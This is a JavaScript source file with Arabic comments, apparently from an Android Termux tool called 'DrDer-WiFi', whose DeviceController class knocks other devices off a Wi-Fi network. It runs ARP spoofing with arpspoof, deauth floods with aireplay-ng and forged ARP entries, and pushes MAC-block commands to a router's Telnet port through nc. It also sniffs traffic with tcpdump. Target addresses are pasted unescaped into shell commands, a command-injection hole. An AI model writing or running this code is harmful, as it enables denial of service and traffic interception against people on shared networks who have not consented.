// ============================================================
// DrDer-WiFi - وحدة التحكم بالأجهزة المتصلة
// يعمل داخل Termux على أندرويد
// ============================================================

const { exec } = require('child_process');
const { RealScanner } = require('./scanner');

/**
 * فئة التحكم بالأجهزة
 */
class DeviceController {

    /**
     * تنفيذ أمر في النظام
     * @param {string} command - الأمر
     * @returns {Promise<string>} الناتج
     */
    static execCommand(command) {
        return new Promise((resolve, reject) => {
            exec(command, { timeout: 15000 }, (error, stdout, stderr) => {
                if (error && !stdout) {
                    reject(error);
                    return;
                }
                resolve(stdout || stderr || '');
            });
        });
    }

    /**
     * قطع اتصال جهاز عن الشبكة
     * @param {string} targetIP - عنوان IP للجهاز الهدف
     * @param {string} targetMAC - عنوان MAC للجهاز الهدف
     * @returns {Promise<object>} نتيجة العملية
     */
    static async disconnectDevice(targetIP, targetMAC) {
        try {
            const networkInfo = await RealScanner.getNetworkInfo();
            const gateway = networkInfo.gateway;

            if (!gateway) {
                throw new Error('لم يتم العثور على عنوان الراوتر');
            }

            const result = {
                success: false,
                method: null,
                message: ''
            };

            // الطريقة الأولى: ARP Spoofing باستخدام arpspoof إذا كان متوفراً
            try {
                await this.execCommand('which arpspoof 2>/dev/null');
                // arpspoof متوفر، نستخدمه
                await this.execCommand('arpspoof -i wlan0 -t ' + targetIP + ' ' + gateway + ' 2>/dev/null &');
                await this.execCommand('arpspoof -i wlan0 -t ' + gateway + ' ' + targetIP + ' 2>/dev/null &');
                await RealScanner.sleep(5000);
                await this.execCommand('pkill arpspoof 2>/dev/null');
                result.success = true;
                result.method = 'ARP Spoofing';
                result.message = 'تم قطع اتصال الجهاز ' + targetIP + ' بنجاح';
            } catch (e) {
                // arpspoof غير متوفر، نجرب طرق أخرى
            }

            // الطريقة الثانية: إغراق الجهاز بحزم deauth باستخدام aireplay-ng
            if (!result.success) {
                try {
                    await this.execCommand('which aireplay-ng 2>/dev/null');
                    if (targetMAC) {
                        await this.execCommand('timeout 5 aireplay-ng --deauth 10 -a ' + this.getBSSID() + ' -c ' + targetMAC + ' wlan0 2>/dev/null');
                        result.success = true;
                        result.method = 'Deauth Attack';
                        result.message = 'تم إرسال حزم فصل للجهاز ' + targetIP;
                    }
                } catch (e) {
                    // aireplay-ng غير متوفر
                }
            }

            // الطريقة الثالثة: التلاعب بجدول ARP يدوياً
            if (!result.success) {
                try {
                    // حذف ARP entry وإضافة entry مزيف مؤقتاً
                    await this.execCommand('arp -d ' + targetIP + ' 2>/dev/null');
                    // إضافة entry غير صحيح ثم حذفه
                    await this.execCommand('arp -s ' + targetIP + ' 00:11:22:33:44:55 2>/dev/null');
                    await RealScanner.sleep(3000);
                    await this.execCommand('arp -d ' + targetIP + ' 2>/dev/null');
                    result.success = true;
                    result.method = 'ARP Table Manipulation';
                    result.message = 'تم محاولة قطع اتصال الجهاز ' + targetIP;
                } catch (e) {
                    // فشل أيضاً
                }
            }

            // الطريقة الرابعة: محاولة الاتصال بالراوتر وحظر MAC
            if (!result.success) {
                try {
                    const routerBlockResult = await this.blockViaRouter(targetMAC, gateway);
                    if (routerBlockResult.success) {
                        return routerBlockResult;
                    }
                } catch (e) {
                    // تجاهل
                }
            }

            if (!result.success) {
                result.message = 'تعذر قطع اتصال الجهاز. قد تحتاج إلى تثبيت أدوات إضافية مثل arpspoof أو aireplay-ng.';
            }

            return result;
        } catch (error) {
            return {
                success: false,
                method: null,
                message: 'فشل قطع الاتصال: ' + error.message
            };
        }
    }

    /**
     * حظر جهاز عبر الراوتر باستخدام Telnet
     * @param {string} targetMAC - عنوان MAC للجهاز
     * @param {string} gateway - عنوان الراوتر
     * @returns {Promise<object>} نتيجة العملية
     */
    static async blockViaRouter(targetMAC, gateway) {
        if (!targetMAC) {
            return { success: false, method: null, message: 'عنوان MAC غير متوفر للحظر عبر الراوتر' };
        }

        try {
            // محاولة الاتصال بالراوتر عبر Telnet (يعمل مع راوترات TP-Link)
            const macFormatted = targetMAC.replace(/:/g, '-').toUpperCase();
            const commands = [
                'ip mac filter add ' + macFormatted + ' 1',
                'save'
            ];

            // نحتاج إلى expect أو netcat للتفاعل
            try {
                await this.execCommand('which nc 2>/dev/null');
                for (const cmd of commands) {
                    await this.execCommand('echo "' + cmd + '" | timeout 3 nc ' + gateway + ' 23 2>/dev/null');
                }
                return {
                    success: true,
                    method: 'Router MAC Filter',
                    message: 'تم محاولة حظر الجهاز ' + targetMAC + ' عبر الراوتر'
                };
            } catch (e) {
                // nc غير متوفر
            }
        } catch (error) {
            // فشل
        }

        return { success: false, method: null, message: 'تعذر الاتصال بالراوتر. تأكد من دعم الراوتر لـ Telnet.' };
    }

    /**
     * الحصول على BSSID الحالي (MAC الراوتر)
     * @returns {string|null} BSSID
     */
    static getBSSID() {
        try {
            const output = require('child_process').execSync('iwgetid -a 2>/dev/null', { timeout: 3000 }).toString();
            const match = output.match(/([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})/);
            return match ? match[0] : null;
        } catch (e) {
            return null;
        }
    }

    /**
     * مراقبة الأجهزة النشطة حالياً
     * @returns {Promise<Array>} قائمة الأجهزة النشطة
     */
    static async getActiveDevices() {
        try {
            // استخدام netstat لمعرفة الاتصالات النشطة
            const output = await this.execCommand('netstat -nt 2>/dev/null | grep ESTABLISHED');
            const connections = [];
            const lines = output.split('\n');
            const seen = new Set();

            for (const line of lines) {
                const trimmed = line.trim();
                if (!trimmed) continue;

                const parts = trimmed.split(/\s+/);
                if (parts.length >= 5) {
                    const localAddr = parts[3];
                    const remoteAddr = parts[4];

                    // استخراج IP فقط
                    const remoteIP = remoteAddr.split(':')[0];
                    const localPort = localAddr.split(':')[1];

                    if (remoteIP && !remoteIP.startsWith('127.') && !seen.has(remoteIP)) {
                        seen.add(remoteIP);
                        connections.push({
                            ip: remoteIP,
                            localPort: localPort,
                            status: 'نشط'
                        });
                    }
                }
            }

            return connections;
        } catch (error) {
            return [];
        }
    }

    /**
     * إعادة تشغيل نقطة الوصول (يتطلب صلاحيات root)
     * @returns {Promise<object>} نتيجة العملية
     */
    static async restartAccessPoint() {
        try {
            // محاولة إعادة تشغيل Wi-Fi
            await this.execCommand('svc wifi disable 2>/dev/null');
            await RealScanner.sleep(2000);
            await this.execCommand('svc wifi enable 2>/dev/null');
            return {
                success: true,
                message: 'تم إعادة تشغيل نقطة الوصول بنجاح'
            };
        } catch (error) {
            return {
                success: false,
                message: 'تعذر إعادة تشغيل Wi-Fi: ' + error.message
            };
        }
    }

    /**
     * معرفة الأجهزة التي تستهلك باندويث عالي
     * @returns {Promise<Array>} قائمة الأجهزة مع استهلاك البيانات
     */
    static async getBandwidthUsage() {
        try {
            // استخدام iftop أو tcpdump لمراقبة الحركة (لمدة قصيرة)
            const output = await this.execCommand('timeout 5 tcpdump -i wlan0 -n -c 50 2>/dev/null');
            const ipCount = {};
            const lines = output.split('\n');

            for (const line of lines) {
                const ipMatch = line.match(/([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)/g);
                if (ipMatch) {
                    ipMatch.forEach(ip => {
                        if (!ip.startsWith('127.')) {
                            ipCount[ip] = (ipCount[ip] || 0) + 1;
                        }
                    });
                }
            }

            // ترتيب الأجهزة حسب النشاط
            const sorted = Object.entries(ipCount)
                .sort((a, b) => b[1] - a[1])
                .slice(0, 10)
                .map(([ip, count]) => ({
                    ip: ip,
                    packets: count,
                    usage: count > 20 ? 'عالي' : count > 10 ? 'متوسط' : 'منخفض'
                }));

            return sorted;
        } catch (error) {
            return [];
        }
    }
}

module.exports = { DeviceController };
